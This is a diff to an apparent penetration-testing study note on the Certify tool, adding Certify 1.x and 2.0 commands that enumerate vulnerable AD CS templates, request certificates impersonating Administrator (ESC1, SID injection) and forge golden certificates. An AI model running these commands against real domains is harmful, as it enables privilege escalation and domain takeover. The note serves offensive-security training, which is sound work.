@@ -7,17 +7,29 @@ Windows C# tool (GhostPack) for enumerating and abusing Active Directory Certifi
 **Source:** https://github.com/GhostPack/Certify
 **Install:** build from source with Visual Studio/`msbuild`, or drop a prebuilt binary — no package manager distribution.
 
-```powershell
-# Enumerate CAs
-.\Certify.exe cas
+> [!warning] **Two incompatible command syntaxes — check your version first (`.\Certify.exe` prints the banner + version).** The GhostPack repo was **rewritten as Certify 2.0**, which replaces the classic `verb /arg:val` syntax with **subcommands + POSIX `--flags`**. Countless binaries and writeups still use **1.x**, so both are below. `/altname:` is gone in 2.0 — the SAN is set with explicit `--upn` / `--dns` / `--sid`.
 
-# Enumerate all templates / only vulnerable ones
-.\Certify.exe find
+```powershell
+# ---- Certify 1.x (classic — the binary in most writeups) ----
+.\Certify.exe cas                                   # enumerate CAs
+.\Certify.exe find                                  # all templates
 .\Certify.exe find /vulnerable
 .\Certify.exe find /vulnerable /currentuser
-
-# Request a certificate with an alternate SAN (ESC1-style)
+# Request a cert with an alternate SAN (ESC1-style)
 .\Certify.exe request /ca:<domain>\<CA_Name> /template:<Template> /altname:Administrator
+```
+
+```powershell
+# ---- Certify 2.0 (current main branch) — same actions, new grammar ----
+.\Certify.exe enum-cas                              # was: cas
+.\Certify.exe enum-templates                        # was: find
+.\Certify.exe enum-templates --filter-vulnerable    # was: find /vulnerable
+.\Certify.exe enum-templates --filter-vulnerable --current-user
+# ESC1 request — SAN via --upn (there is no --altname in 2.0)
+.\Certify.exe request --ca <domain>\<CA_Name> --template <Template> --upn administrator@<domain>
+# ESC9/ESC10 SID injection and golden-cert forging also live here:
+.\Certify.exe request --ca <domain>\<CA_Name> --template <Template> --upn administrator@<domain> --sid <target-SID>
+.\Certify.exe forge --ca-cert CA.pfx --ca-pass <pw> --upn administrator@<domain> --subject 'CN=Administrator,...'
 ```
 
 > [!note] **See also** — [[Services/Active Directory/ADCS|ADCS]] for the full ESC1–ESC16 attack methodology this tool is used against. Also [[Class notes/HTB Academy/CPTS v2 (claude)/Windows Priv Esc|Windows Priv Esc]] (CPTS v2) — AD CS enumeration and abuse from a Windows host.
@@ -25,5 +37,5 @@ Windows C# tool (GhostPack) for enumerating and abusing Active Directory Certifi
 ---
 
 *Created: 2026-07-27*
-*Updated: 2026-08-18*
-*Model: claude-opus-5*
+*Updated: 2026-09-28*
+*Model: claude-opus-4-8*
